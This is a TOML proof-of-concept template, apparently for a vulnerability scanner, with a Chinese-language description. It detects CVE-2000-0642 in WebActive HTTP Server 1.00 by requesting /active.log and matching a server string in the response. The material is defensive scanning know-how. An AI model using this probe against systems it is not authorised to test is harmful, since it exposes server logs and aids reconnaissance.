[info]
author = "ave"
description = "通过 HTTP GET 请求 WebActive HTTP Server 1.00 文档根目录下的 /active.log 文件，若响应中包含 'WEBactive Http Server' 字符串，则表明目标存在日志信息泄露漏洞。"
id = "POC-AVE-2000-0780"
name = "WebActive HTTP Server active.log Remote Information Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0780"]
vuln_id = [
    "CVE-2000-0642",
    "AVE-2000-0780",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/active.log"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["WEBactive Http Server"]
